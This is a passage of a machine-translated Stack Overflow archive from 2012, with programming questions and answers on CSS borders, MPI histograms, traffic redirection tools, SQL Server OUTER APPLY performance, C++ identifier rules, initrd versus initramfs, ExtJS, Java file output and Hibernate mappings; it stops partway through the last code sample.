* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T14:41:08.907

当您添加边框时，您也可以添加`margin: -1px;`到元素中（确保在关闭边框时正确反转该过程）

或者给所有`border: 1px solid transparent`（认为他们现在都支持）然后你只需要改变边框颜色。您可以修改，`border-color: rgba(222,0,0,0);`然后修改`rgba(222,0,0,1)`活动元素，其中 a 是透明度。但是，`rgba`在 IE atm 中并没有得到很好的支持。

# parallel-processing - 并行计算二维数组的直方图

> ID：10603087
> 
> 赞同：1
> 
> 时间：2012-05-15T14:37:10.730
> 
> 标签：parallel-processing, mpi

我有一个 9x9 二维数组。我用随机数填充数组，然后发送数组的第 3 行以 rank=1 处理，数组的第 2 3 行以 rank=2 处理，最后发送数组的第 3 3 行以处理排名=3。我的意思是每个进程将获得 3 行数组。

进程接收到主数组的各行后，将计算从根进程接收到的3行的直方图。然后将直方图返回到根进程。所有 3 个进程都将执行此任务。

问题是 rank=3 的进程无法接收根进程发送的行。我想不通为什么？如果有人查看我的代码并为我的问题找到解决方案，我将不胜感激。

提前致谢。

我将 MPI 与 c 一起使用。这是我的代码

```
#include "mpi.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <conio.h>
#include <time.h>

int main(int argc, char* argv[])
{
int my_rank;
int p;
int i;
int k;
int m;
int tag=0;
int array[9][9];
int sub_array[3][9];    // 3 rows and 9 columns for each process
int c[20];

MPI_Status status;
//  MPI_Datatype MPI_INT;

MPI_Init(&argc,&argv);
MPI_Comm_rank(MPI_COMM_WORLD,&my_rank);
MPI_Comm_size(MPI_COMM_WORLD,&p);

//  MPI_Type_contiguous(9,MPI_INT,&MPI_INT);
//  MPI_Type_commit(&MPI_INT);
srand(time(NULL));

for(i=0; i<20 ; i++)
            c[i] = 0;

    if(my_rank == 0)
    {

    for(i=0; i<9 ; i++)

        for(k=0; k<9 ; k++)
        {
                array[i][k] = rand()%20+1;  // fill the array with random numbers from 1 to 20;
        }

        for(i=0; i<9 ; i++)
        {
            printf("\n");
            for(k=0; k<9 ; k++)
        {
                printf("%d ",array[i][k]); // prints the array here
        }
        }

        // here each process will be sent 3 rows of the array;
        for(i=0; i<3 ; i++)
                MPI_Send(&(array[i][0]),9,MPI_INT,1,tag,MPI_COMM_WORLD); // 1st 3 rows of the array are sent to process 1
        for(i=3; i<6 ; i++)
                MPI_Send(&(array[i][0]),9,MPI_INT,2,tag,MPI_COMM_WORLD); // 2nd 3 rows of the array are sent to process 2
        for(i=6; i<9 ; i++)
                MPI_Send(&(array[i][0]),9,MPI_INT,3,tag,MPI_COMM_WORLD); // 3rd 3 rows of the array are sent to process 3

        for (i=1;i<=3;i++)
        MPI_Recv(&sub_array, 9, MPI_INT,i, 0, MPI_COMM_WORLD, &status);  // root receives the subarrays from each node;
    }

if(my_rank != 0)
{
    // for the process with rank=1;
        for(i=0; i<3 ; i++)
        {
            MPI_Recv(&(sub_array[i][0]),9,MPI_INT,0,tag,MPI_COMM_WORLD,&status);

                for(k=0; k<9 ; k++)
                {
                    for(m=0 ; m<20 ; m++)       // here the process with rank=1 calculates the histogram
                    {
                        if(sub_array[i][k] == m)
                            c[m]++;
                    }
                }
        }       

        // for the process with rank=2
        for(i=3; i<6 ; i++)
        {
            MPI_Recv(&(sub_array[i][0]),9,MPI_INT,0,tag,MPI_COMM_WORLD,&status);

                for(k=0; k<9 ; k++)
                {
                    for(m=0 ; m<20 ; m++)  // here the process with rank=2 calculates the histogram
                    {
                        if(sub_array[i][k] == m)
                            c[m]++;
                    }
                }
        }
        // for the process with rank=3
        for(i=6; i<9 ; i++)
        {
            MPI_Recv(&(sub_array[i][0]),9,MPI_INT,0,tag,MPI_COMM_WORLD,&status);
            for(k=0; k<9 ; k++)

                {
                    for(m=0 ; m<20 ; m++)   // here the process with rank=3 calculates the histogram
                    {
                        if(sub_array[i][k] == m)
                            c[m]++;
                    }
                }
        }
}

    // here the histogram must be printed.
    for(k=0; k<20 ; k++)
    {
        printf("\n");
        printf("%2d : ",k);
        for(i=0 ; i<c[k] ; i++)
    {
        printf("=");
    }
    }

    MPI_Finalize();
return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:48:16.283

在以下循环中：

```
 // for the process with rank=3
        for(i=6; i<9 ; i++)
        {
            // snip
            for(i=0; i<3 ; i++) // notice the reuse of the var i here!
            //snip

        } 
```

在循环中，您正在重新分配`i`. 这可能是你的问题。对于等级为 1 和 2 的 procs 循环，您`k`为此循环使用不同的变量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:00:55.617

```
#include <stdio.h>
#include <conio.h>
#include <time.h>

int main(int argc, char* argv)
{
int my_rank;
int p;
int Array[9];
int localArray[3];
int i;
int k;
int m;
int a[9][9];
int b[10][50];
int c[20];

MPI_Status status;
MPI_Datatype my_type;

MPI_Init(&argc,&argv);
MPI_Comm_rank(MPI_COMM_WORLD,&my_rank);
MPI_Comm_size(MPI_COMM_WORLD,&p);

MPI_Type_contiguous(9,MPI_INT,&my_type);
MPI_Type_commit(&my_type);
srand(time(NULL));

    for(i=0; i<20 ; i++)
    c[i] = 0;

    if(my_rank == 0)
    {

    for(i=0; i<9 ; i++)
        for(k=0; k<9 ; k++)
        {
                a[i][k] = rand()%20;
        }

        for(i=0; i<9 ; i++)
        {
            printf("\n");
            for(k=0; k<9 ; k++)
        {
                printf("%d ",a[i][k]);
        }
        }

        for(i=0; i<3 ; i++)
                MPI_Send(&(a[i][0]),1,my_type,1,0,MPI_COMM_WORLD);
        for(i=3; i<6 ; i++)
                MPI_Send(&(a[i][0]),1,my_type,2,0,MPI_COMM_WORLD);
        for(i=6; i<9 ; i++)
                MPI_Send(&(a[i][0]),1,my_type,3,0,MPI_COMM_WORLD);
    }

if(my_rank != 0)
{
        for(i=0; i<3 ; i++)
        {
            MPI_Recv(&(b[i][0]),1,my_type,0,0,MPI_COMM_WORLD,&status);
        }
        for(i=0; i<3 ; i++)
            for(k=0; k<9 ; k++)
            {
                for(m=0 ; m<20 ; m++)
                {
                    if(b[i][k] == m)
                        c[m]++;
                }
            }

            printf("\n \n ");
            for(m=0 ; m<20 ; m++)
                printf("%d ",c[m]);

        for(i=3; i<6 ; i++)
        {
            MPI_Recv(&(b[i][0]),1,my_type,0,0,MPI_COMM_WORLD,&status);
        }

        for(i=0; i<3 ; i++)
            for(k=0; k<9 ; k++)
            {
                for(m=0 ; m<20 ; m++)
                {
                    if(b[i][k] == m)
                        c[m]++;
                }
            }

            printf("\n \n ");
            for(m=0 ; m<20 ; m++)
                printf("%d ",c[m]);

        for(i=0; i<3 ; i++)
        {
            MPI_Recv(&(b[i][0]),1,my_type,0,0,MPI_COMM_WORLD,&status);
        }
        for(i=0; i<3 ; i++)
            for(k=0; k<9 ; k++)
            {
                for(m=0 ; m<20 ; m++)
                {
                    if(b[i][k] == m)
                        c[m]++;
                }
            }

            printf("\n \n ");
            for(m=0 ; m<20 ; m++)
                printf("%d ",c[m]);
}

    for(k=0; k<20 ; k++)
    {
        printf("\n");
        printf("%2d : ",k);
        for(i=0 ; i<c[k] ; i++)
    {
        printf("=");
    }
    }

    MPI_Finalize();
 return 0;
} 
```

@Colin DI 编辑了上面的代码，它现在可以工作但问题是 3.processor 没有接收或 0.processor 无法发送行。我没有做到这一点。

# redirect - 重定向所有查询的程序

> ID：10603092
> 
> 赞同：0
> 
> 时间：2012-05-15T14:37:24.037
> 
> 标签：redirect

我不知道如何真正描述我的问题，但我会试一试。

我希望所有查询（例如，应用程序试图到达/发送某些东西到：68.655.21.1:8421）。我希望我能够捕捉到这一点并用我自己的答案进行回复。

因此，如果任何程序试图将数据发送到任何域或 IP，它将被重定向到我的本地主机或任​​何其他 IP。

对不起，这个糟糕的描述，我很难找到合适的词。

希望有好的答案=）

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T14:44:17.050

查看您的[HOSTS](http://en.wikipedia.org/wiki/Hosts_%28file%29)文件

研究类似[WinPCap 的东西](http://www.winpcap.org/)

查看外部[袜子代理](http://en.wikipedia.org/wiki/SOCKS)

如果您只想捕获http流量，请查看[fiddler](http://www.fiddler2.com/fiddler2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T14:39:55.673

您可以尝试使用[Fiddler 之](http://www.fiddler2.com/fiddler2/)类的工具。

# sql-server - 外用函数的性能

> ID：10603095
> 
> 赞同：3
> 
> 时间：2012-05-15T14:37:41.777
> 
> 标签：sql-server, sql-server-2008

我有几个使用外部应用的存储过程。外部应用内的查询总是相同的，所以我可以构建一个通用的表值函数，这给我代码重用带来了明显的好处，但我想知道这两种方式是否会对性能产生影响。如果我调用一个函数，我会受到打击吗？

例如：

```
SELECT
    m.[ID],
    m.[MyField],
    o.[OtherField]
FROM
    [MyTable] m
OUTER Apply
(
    fMyFunction(m.[ID])
) 
```

VS

```
SELECT
    mt.[ID],
    mt.[MyField],
    o.[OtherField]
FROM
    [MyTable] mt
OUTER Apply
(
    SELECT TOP 1
        ot.[OtherField]
    FROM
        [OtherTable] ot 
    WHERE
        ot.[ID] = m.[ID]
) o 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T20:06:21.410

这取决于函数类型：

1.  如果函数是一个内联表值函数，那么这个函数将被认为是一个“参数化”视图并且`SQL Server`可以做一些优化工作。

2.  如果函数是多步表值函数，则很难`SQL Server`优化语句，并且输出`SET STATISTICS IO`会产生误导。

对于我使用的下一个测试`AdventureWorks2008`（您可以从 CodePlex 下载此数据库）。在此示例数据库中，您可能会找到一个`inline table-valued function`名为`[Sales].[ufnGetCheapestProduct]`：

```
ALTER FUNCTION [Sales].[ufnGetCheapestProduct](@ProductID INT)
RETURNS TABLE
AS
RETURN
    SELECT   dt.ProductID
            ,dt.UnitPrice
    FROM
    (
        SELECT   d.SalesOrderDetailID
                ,d.UnitPrice
                ,d.ProductID  
                ,ROW_NUMBER() OVER(PARTITION BY d.ProductID ORDER BY d.UnitPrice ASC, d.SalesOrderDetailID) RowNumber
        FROM    Sales.SalesOrderDetail d
        WHERE   d.ProductID = @ProductID
    ) dt
    WHERE   dt.RowNumber = 1 
```

我创建了一个名为`[Sales].[ufnGetCheapestProductMultiStep]`. 这个函数是一个`multi-step table-valued function`：

```
CREATE FUNCTION [Sales].[ufnGetCheapestProductMultiStep](@ProductID INT)
RETURNS @Results TABLE (ProductID INT PRIMARY KEY, UnitPrice MONEY NOT NULL)
AS
BEGIN
    INSERT  @Results(ProductID, UnitPrice)
    SELECT   dt.ProductID
            ,dt.UnitPrice
    FROM
    (
        SELECT   d.SalesOrderDetailID
                ,d.UnitPrice
                ,d.ProductID  
                ,ROW_NUMBER() OVER(PARTITION BY d.ProductID ORDER BY d.UnitPrice ASC, d.SalesOrderDetailID) RowNumber
        FROM    Sales.SalesOrderDetail d
        WHERE   d.ProductID = @ProductID
    ) dt
    WHERE   dt.RowNumber = 1;

    RETURN;
END 
```

现在，我们可以运行下一个测试：

```
--Test 1
SELECT  p.ProductID, p.Name, oa1.*
FROM    Production.Product p
OUTER APPLY 
(
    SELECT   dt.ProductID
            ,dt.UnitPrice
    FROM
    (
        SELECT   d.SalesOrderDetailID
                ,d.UnitPrice
                ,d.ProductID  
                ,ROW_NUMBER() OVER(PARTITION BY d.ProductID ORDER BY d.UnitPrice ASC, d.SalesOrderDetailID) RowNumber
        FROM    Sales.SalesOrderDetail d
        WHERE   d.ProductID = p.ProductID
    ) dt
    WHERE   dt.RowNumber = 1
) oa1

--Test 2
SELECT  p.ProductID, p.Name, oa2.*
FROM    Production.Product p
OUTER APPLY [Sales].[ufnGetCheapestProduct](p.ProductID) oa2

--Test 3
SELECT  p.ProductID, p.Name, oa3.*
FROM    Production.Product p
OUTER APPLY [Sales].[ufnGetCheapestProductMultiStep](p.ProductID) oa3 
```

这是来自的输出`SQL Profiler`： ![在此处输入图像描述](../Images/cef46d1c8eb9c3857b8dc55831255adb.png)

**结论**：您可以看到，使用查询或内联表值函数`OUTER APPLY`将为您提供相同的性能（逻辑读取）。另外：[多步表值函数（通常）更昂贵](http://blogs.msdn.com/b/psssql/archive/2010/10/28/query-performance-and-multi-statement-table-valued-functions.aspx)。

**注意**：我不建议使用`SET STATISTICS IO`测量`IO`标量和多步表值函数，因为结果可能是错误的。例如，对于这些测试，输出`SET STATISTICS IO ON`将是：

```
--Test 1
Table 'SalesOrderDetail'. Scan count 504, logical reads 1513, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.
Table 'Product'. Scan count 1, logical reads 5, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.

--Test 2
Table 'SalesOrderDetail'. Scan count 504, logical reads 1513, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.
Table 'Product'. Scan count 1, logical reads 5, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.

--Test 3
Table '#064EAD61'. Scan count 504, logical reads 1008 /*WRONG*/, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0.
Table 'Product'. Scan count 1, logical reads 5, physical reads 0, read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob read-ahead reads 0. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T16:16:30.983

`Outer Apply`这里不应该考虑...

**原因**

尽管您将从 MyTable 中获取所有记录，但它将迭代每条记录`MyTable`并搜索表中的相应记录。`Outer Apply`所以它应该被替换为 Join(Left/Inner)。这将加快查询速度，尤其是当您要获取大量记录时。

**[检查Apply和Join之间的区别](http://weblogs.sqlteam.com/jeffs/archive/2007/10/18/sql-server-cross-apply.aspx)**

# c++ - ISO14882 和 ECMA335 标准的有效标识符是什么？

> ID：10603103
> 
> 赞同：0
> 
> 时间：2012-05-15T14:38:23.617
> 
> 标签：c++, clr, standards, native

*标准最美妙的地方在于有这么多。*[与CLI-Standard (5th edition)](http://www.ecma-international.org/publications/standards/Ecma-335.htm)相比，阅读[C++11 标准](http://www.iso.org/iso/catalogue_detail?csnumber=50372)时，我对标识符命名有点困惑。

C++ 允许根据*[ISO/IEC 14882:2011 第 23 页]* ASCI：（`_a-zA-Z0-9`无论顺序）和根据*[第 1249 页]*`$`很多 unicode 字符.. (0x24)没有定义。另一方面*[ECMA335 partition II page 13]*允许`a-zA-Z0-9_``@$`作为标识符字符。

换句话说，C++ 不应该支持`$`(0x24) 内部标识符名称，但 CLR 应该。在测试这个时，我注意到完全相反：

*   本机 C++（[本机 MSVC [VS2010 Ultimate]](http://www.microsoft.com/visualstudio/en-us)、[GCC [2.8.1]](http://www.gnu.org/software/gcc/)、[minGW [最新]](http://www.mingw.org/)）支持`$`；
*   C++\CLI 甚至 C# (MSVC) 都不支持`$`.

那么真相是什么？阅读标准时我是否遗漏了什么？还是每个人都在做他想做的事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T14:44:28.033

没有理由以 CLR 为目标的语言应该支持 CLR 标识符中允许的所有字符。例如，C# 不允许使用`$`or之类的字符```，并将其中的一些用于编译器生成的标识符。

我希望有一个 C++ 实现，无论它是针对 CLR 还是普通汇编代码来使用 C++ 规范中的字符集。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:17:55.577

一个复杂的问题是第 2.2 节说：

> 如有必要，物理源文件字符以实现定义的方式映射到基本源字符集（为行尾指示符引入换行符）。接受的物理源文件字符集是实现定义的。

所以我们正式不知道`$`源文件中的 对应标识符中的美元符号。它只是可能被映射到其他东西。

语言标准中的要求也是实现必须提供的最低要求。所有编译器都提供标准语言的扩展。允许标识符名称中的额外字符可能是这样的扩展，可能是为了支持旧的预标准代码或某些操作系统特定的功能。

# linux - initrd 和 initramfs 的区别？

> ID：10603104
> 
> 赞同：80
> 
> 时间：2012-05-15T14:38:26.757
> 
> 标签：linux, filesystems, kernel, boot

据我所知，`initrd`它充当块设备，因此需要文件系统驱动程序（例如`ext2`）。内核必须至少有一个内置模块来检测`initrd`. 在这篇文章[introducing initramfs，一种用于初始 RAM 磁盘的新模型中](http://www.linuxfordevices.com/c/a/Linux-For-Devices-Articles/Introducing-initramfs-a-new-model-for-initial-RAM-disks/)，它写道：

> 但是由于缓存，ramdisk 实际上浪费了更多的内存。Linux 旨在缓存从块设备读取或写入的所有文件和目录条目，因此 Linux 将数据从 ramdisk 复制到“页面缓存”（用于文件数据）和“dentry 缓存”（用于目录条目） . 伪装成块设备的 ramdisk 的缺点是它被视为块设备。

什么是`page cache`和`dentry cache`？在段落中，这是否意味着数据被重复，因为`ramdisk`被视为块设备，因此所有数据都被缓存了？

相反，`ramfs`：

> 几年前，Linus Torvalds 有一个绝妙的想法：如果 Linux 的缓存可以像文件系统一样挂载会怎样？只是将文件保存在缓存中，直到它们被删除或系统重新启动之前永远不会摆脱它们？Linus 为缓存编写了一个名为“ramfs”的小型包装器，其他内核开发人员创建了一个名为“tmpfs”的改进版本（它可以将数据写入交换空间，并限制给定挂载点的大小，以便在使用之前填满）所有可用内存）。Initramfs 是 tmpfs 的一个实例。
> 
> 这些基于 ram 的文件系统会自动增长或缩小以适应它们包含的数据的大小。将文件添加到 ramfs（或扩展现有文件）会自动分配更多内存，删除或截断文件会释放该内存。块设备和缓存之间没有重复，因为没有块设备。缓存中的副本是数据的唯一副本。最重要的是，这不是新代码，而是现有 Linux 缓存代码的新应用程序，这意味着它几乎不增加任何大小，非常简单，并且基于经过严格测试的基础架构。

总之，`ramfs`只是文件打开并加载到内存中，不是吗？

两者`initrd`和`ramfs`都是在编译时压缩的，但不同的是，`initrd`块设备解压缩后由内核在启动时挂载，而`ramfs`通过 cpio 解压缩到内存中。我对么？或者是`ramfs`一个非常小的文件系统？

最后，直到今天，该`initrd`图像仍以最新内核呈现。但是，这`initrd`实际上是`ramfs`今天使用的名称，并且只是出于历史目的吗？

* * *

## 回答 #1

> 赞同：79
> 
> 时间：2012-05-15T15:27:32.507

我认为你是对的。

如果您在启动时遵循所需的步骤，则很容易看出差异：

## `initrd`

*   创建一个`ramdev`块设备。它是基于 ram 的块设备，即使用内存而不是物理磁盘的模拟硬盘。
*   该`initrd`文件被读取并解压缩到设备中，就像您这样做`zcat initrd | dd of=/dev/ram0`或类似的东西一样。
*   包含文件系统的`initrd`映像，因此现在您可以照常挂载文件系统：`mount /dev/ram0 /root`. 自然，文件系统需要驱动程序，所以如果您使用 ext2，则必须在内核中编译 ext2 驱动程序。
*   完毕！

## `initramfs`

*   A`tmpfs`已安装：`mount -t tmpfs nodev /root`. tmpfs 不需要驱动程序，它总是在内核上。无需设备，无需额外的驱动程序。
*   `initramfs`直接解压缩到这个新的文件系统中：，`zcat initramfs | cpio -i`或类似的。
*   完毕！

是的，它在很多地方仍然被调用`initrd`，尽管它是一个`initramfs`，特别是在引导加载程序中，因为它只是一个 BLOB。操作系统启动时会产生差异。

* * *

## 回答 #2

> 赞同：56
> 
> 时间：2012-05-15T16:05:39.280

# Dentry（和 inode）缓存

Linux 中的文件系统子系统具有三层。VFS（虚拟文件系统），它实现系统调用接口并处理跨挂载点以及默认权限和限制检查。下面是单个文件系统的驱动程序，以及与块设备（磁盘、内存卡等；网络接口除外）驱动程序的接口。

VFS 和文件系统之间的接口是几个类（它是普通的 C，所以结构包含指向函数等的指针，但它在概念上是面向对象的接口）。主要的三个类是`inode`，描述文件系统中的任何对象（文件或目录），`dentry`描述目录中的条目`file`，以及描述进程打开的文件。挂载后，文件系统驱动程序会创建它的根，`inode`而`dentry`其他驱动程序是在进程想要访问文件并最终过期时按需创建的。那是一个 dentry 和 inode 缓存。

是的，这确实意味着对于每个打开的文件和任何目录到根目录，都必须在内核内存中分配代表它的结构`inode`。`dentry`

# 页面缓存

在 Linux 中，每个包含用户空间数据的内存页面都由统一的`page`结构表示。这可能会将页面标记为匿名（如果可用，可能会交换到交换空间）或将其与`inode`某个文件系统相关联（可能会被写回文件系统并从文件系统重新读取），并且它可以是任意数量的内存映射的一部分，即在某个进程的地址空间中可见。当前加载到内存中的所有页面的总和就是页面缓存。

页面用于实现 mmap 接口，而文件系统可以通过其他方式实现常规读写系统调用，但大多数接口使用也使用页面的通用函数。有一些通用函数，当请求读取文件时，分配页面并调用文件系统来逐一填充它们。对于基于块设备的文件系统，它只计算适当的地址并将此填充委托给块设备驱动程序。

# ramdev（虚拟磁盘）

Ramdev 是常规块设备。这允许在其上分层任何文件系统，但它受到块设备接口的限制。这只是填充调用者分配的页面并将其写回的方法。这正是真正的块设备（如磁盘、存储卡、USB 大容量存储等）所需要的，但对于 ramdisk 这意味着数据在内存中存在两次，一次在 ramdev 的内存中，一次在由呼叫者。

这是旧的实现方式`initrd`。从 initrd 很少见和异国情调的时代开始。

# tmpfs

Tmpfs 是不同的。这是一个虚拟文件系统。它提供给 VFS 的方法是使其工作的绝对最低限度（因此它是关于 inode、dentry 和 file 方法应该做什么的优秀文档）。文件只有在 inode 缓存中存在对应的 inode 和 dentry 时才存在，在文件创建时创建并且永不过期，除非文件被删除。当数据被写入时，页面与文件相关联，否则表现为匿名页面（数据可以存储为交换，`page`只要文件存在，结构就会保持使用状态）。

这意味着内存中没有额外的数据副本，整个事情要简单得多，而且速度也更快。它只是使用数据结构，作为任何其他文件系统的缓存，因为它是主存储。

这是实现`initrd`(的新方法`initramfs`，但图像仍称为 just `initrd`)。

这也是实现“posix共享内存”的方式（这仅仅意味着安装了tmpfs`/dev/shm`并且应用程序可以自由地在那里创建文件并映射它们；简单而高效）最近甚至`/tmp`和`/run`（或`/var/run`）经常安装tmpfs，特别是在笔记本上以防止磁盘在 SSD 的情况下必须旋转或避免一些磨损。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2019-01-22T10:32:25.450

**最小可运行 QEMU 示例和新手解释**

在这个答案中，我将：

*   提供一个最小的可运行 Buildroot + QEMU 示例供您测试
*   为可能在谷歌上搜索的初学者解释两者之间最基本的区别

希望这些将作为验证和理解差异的更多内部细节的基础。

此处的最小设置是[完全自动化的](https://github.com/cirosantilli/linux-kernel-module-cheat/tree/8217e5508782827320209644dcbaf9a6b3141724#initrd)，这就是[相应的入门](https://github.com/cirosantilli/linux-kernel-module-cheat/tree/8217e5508782827320209644dcbaf9a6b3141724#qemu-buildroot-setup-getting-started)。

安装程序会在运行 QEMU 命令时打印出它们，并且如该 repo 中所述，我们可以轻松生成以下三种工作类型的引导：

1.  根文件系统位于 ext2“硬盘”中：

    ```
    qemu-system-x86_64 -kernel normal/bzImage -drive file=rootfs.ext2 
    ```

2.  根文件系统在 initrd 中：

    ```
    qemu-system-x86_64 -kernel normal/bzImage -initrd rootfs.cpio 
    ```

    `-drive`没有给出。

    `rootfs.cpio`包含与 相同的文件`rootfs.ext2`，除了它们是[CPIO](https://en.wikipedia.org/wiki/Cpio)格式，类似于`.tar`：它序列化目录而不压缩它们。

3.  根文件系统在 initramfs 中：

    ```
    qemu-system-x86_64 -kernel with_initramfs/bzImage 
    ```

    既没有`-drive`也没有`-initrd`给出。

    `with_initramfs/bzImage`是使用与 相同的选项编译的内核`normal/bzImage`，除了一个：`CONFIG_INITRAMFS_SOURCE=rootfs.cpio`指向与示例中完全相同的 CPIO `-initrd`。

通过比较设置，我们可以得出每个设置的最基本属性：

1.  在硬盘设置中，QEMU 将 bzImage 加载到内存中。

    这项工作通常由引导加载程序/固件在[GRUB 等](https://stackoverflow.com/questions/22054578/how-to-run-a-program-without-an-operating-system/32483545#32483545)真实硬件中完成。

    Linux 内核启动，然后使用其驱动程序从磁盘读取根文件系统。

2.  在 initrd 设置中，除了将内核加载到内存中之外，QEMU 还进行了一些引导加载程序工作：它还：

    *   加载`rootfs.cpio`到内存中
    *   通知内核：[https ://unix.stackexchange.com/questions/89923/how-does-linux-load-the-initrd-image](https://unix.stackexchange.com/questions/89923/how-does-linux-load-the-initrd-image)

    这一次，内核直接使用`rootfs.cpio`内存，因为不存在硬盘。

    重新启动后写入不会持久，因为所有内容都在内存中

3.  在 initramfs 设置中，我们构建内核有点不同：我们也将 提供给`rootfs.cpio`内核构建系统。

    内核构建系统然后知道如何将内核映像和 CPIO 粘贴到单个映像中。

    因此，我们需要做的就是将 bzImage 传递给 QEMU。QEMU 将其加载到映像中，就像它为其他设置所做的那样，但没有其他要求：CPIO 也被加载到内存中，因为它被粘在内核映像上！

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2019-01-31T12:10:19.757

在上面的优秀答案中添加另一个值得注意的区别`initrd`和`initramfs`未提及的区别。

*   默认情况下，内核会`initrd`移交给用户空间`pid 1``/sbin/init`
*   然而，较新的 initramfs 会改变并`pid 1`执行`/init`

因为它可能成为一个陷阱（请参阅[https://unix.stackexchange.com/a/147688/24394](https://unix.stackexchange.com/a/147688/24394)）

# extjs - EXT3 JS Grid - 在渲染和排序之前更改特定的 JsonStore 值

> ID：10603105
> 
> 赞同：0
> 
> 时间：2012-05-15T14:38:27.383
> 
> 标签：extjs, extjs3

我想将一个 int 附加到网格中的特定单元格 - 这需要在渲染和排序之前发生，以便用户看到正确的排序

这是为了一个排行榜。

我已经通过 conver-renderer-record.push 等的几次迭代 线索似乎是复制存储并在值已更改时在网格中使用一个新的

对此的任何帮助表示赞赏。

伊恩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:28:36.277

可以做类似于以下的事情：

```
var grid, gridStore, tempStore;

gridStore = new Ext.data.Store();
tempStore = new Ext.data.Store();
grid = new Ext.grid.GridPanel({
    store: gridStore
});
tempStore.addListener("load", function (store, records) {
    //make your modifications to the records (concat the int)

    gridStore.loadData(/*some results*/);
}); 
```

# java - 无法将整数文件写入java中的文件

> ID：10603109
> 
> 赞同：0
> 
> 时间：2012-05-15T14:38:50.917
> 
> 标签：java, integer, writefile

我正在尝试将计算的数据速率的输出保存在文件中。数据速率是整数类型，我无法将其保存在文件中，并且出现以下错误：

```
Exception in thread "main" java.io.IOException: Write error
at java.io.FileOutputStream.write(Native Method)
at java.io.DataOutputStream.write(Unknown Source)
at UDPSend.main(UDPSend.java:60) 
```

代码如下：

```
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPSend {

public static void main(String[] args) throws IOException
{
    FileInputStream fstream = new FileInputStream("T.txt");
    DataInputStream in = new DataInputStream(fstream);
    BufferedReader br = new BufferedReader(new InputStreamReader(in));
    String path="DataRateBefore.txt";
    FileOutputStream f = new FileOutputStream(path);
    DataOutputStream fo = new DataOutputStream (f);
    InetAddress addr = InetAddress.getByName("localhost");
    byte[]  buf  = new byte[10000];

    String DataLine;
    long lastTime = System.currentTimeMillis();
    long firstTime = lastTime;
    int nobits = 0;

    long start = System.currentTimeMillis();
    System.out.println("Start Time: " + start);

    while ((DataLine = br.readLine()) != null)  
    { 
      DatagramPacket packet =new DatagramPacket(DataLine.getBytes(),DataLine.length() , addr, 4553);
      System.out.println (DataLine);
      DatagramSocket socket = new DatagramSocket();
      socket.send(packet);

      nobits+=packet.getLength() * 8;
      System.out.println(packet.getLength());
      System.out.println("no of bits is:");
      System.out.println(nobits);

      if ((System.currentTimeMillis() - lastTime) > 11) 
      {
         lastTime = System.currentTimeMillis();
         System.out.println("data rate is ");
         System.out.println(nobits); 
         fo.write(nobits);
         nobits= 0;
         fo.close();
         fo.flush();
      }

  }//end while loop

  // Get the end time of the process
    long end = System.currentTimeMillis();
    System.out.println("End Time : " + end);
    long elapsedTime = end - start;
  // Show how long it took to finish the process
    System.out.println("The process took approximately: " + elapsedTime + " milliseconds");
  }//end main method 
 } 
```

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:43:19.973

关闭流后，您不应再尝试对其进行任何操作。考虑：

```
fo.close(); 
fo.flush(); 
```

您至少需要交换这两行。此外，要么重新打开`fo`，以便您可以在循环的其他迭代中写入它，或者不要在循环中间关闭它（但在完成循环之后）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:42:11.107

是因为您在写入文件后关闭文件然后再次尝试写入吗？尝试将 fo.close() 放在 while 循环之后。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T14:57:05.940

使用此方法可以保存文件。从源目录读取到命运目录的方法。

```
 static public void movArchivo(File sourceDir, File destinyDir) {
    InputStream in = null;
    OutputStream out = null;

    byte[] buffer = new byte[1024];
    int len;

    try {
        in = new FileInputStream(sourceDir);
        out = new FileOutputStream(destinyDir);

        while((len = in.read(buffer)) > 0) {
            out.write(buffer, 0, len);
        }
        out.flush();
    } catch(FileNotFoundException e) {
        System.out.println("Sistem not found file: " + sourceDir.getAbsolutePath() + " or not existed path.");
    } catch(IOException e) {
        System.out.println("ERROR reading file. " + e.getMessage());
        e.printStackTrace();
    } finally {
        if(in != null) {
            try {
                in.close();
                sourceDir.delete();
                out.close();
            } catch(Exception e2) {
                e2.printStackTrace();
            }
        }
    }
} 
```

我希望能帮助你。:)

# java - 非标准多对多关系的 HQL 查询

> ID：10603110
> 
> 赞同：0
> 
> 时间：2012-05-15T14:38:58.980
> 
> 标签：java, hibernate, jpa, hql

**我在Author**和**Book**之间有 ManyToMany 关系。
表：**作者**
*ID | 姓名*

表：**分配**
*id | 作者_id | book_id*

表：**书号**
*| 标题*

但我使用的不是标准的多对多映射，我正在使用下一个

```
class Book
{
   @Id
   long id;

   String title;

   @OneToMany
   List<Assign> authors;
}

class Assign
{
   @Id
   long id;

   @ManyToOne
   Book book

   @ManyToOne
